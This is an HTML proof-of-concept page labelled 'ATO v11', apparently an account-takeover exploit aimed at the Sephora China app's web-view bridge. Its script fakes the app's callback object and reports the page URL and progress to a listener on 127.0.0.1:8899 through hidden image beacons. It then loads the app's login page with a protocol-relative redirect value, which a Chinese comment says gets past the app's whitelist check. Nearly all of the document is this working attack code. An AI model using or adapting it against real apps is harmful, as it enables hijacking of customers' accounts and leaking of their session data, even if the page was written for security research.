<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ATO-v11</title></head>
<body style="background:#111;color:#0f0;font-family:monospace;padding:16px;font-size:13px">
<h3 style="color:#c9a96e">ATO v11 (real in-place)</h3>
<div id="log"></div>
<script>
window.sep={_onSuccess:function(){},_onFailure:function(){},_onCancel:function(){}};
function B(t,d){new Image().src='http://127.0.0.1:8899/x?t='+t+'&d='+encodeURIComponent(d||'').substring(0,650)}
B('load',location.href);
if(typeof appHandler!=='undefined'){
  // 协议相对URL: b()返回null(非http/https/sephora) + 白名单host匹配通过 → SOL redirect分支 → return false → 原地加载登录页
  var target='https://m.sephora.cn/app/login?historyLocation='+encodeURIComponent('//m.sephora.cn/');
  B('nav','');
  document.getElementById('log').innerHTML='原地跳转登录页...';
  location.href=target;
}else{B('nobridge','')}
</script></body></html>
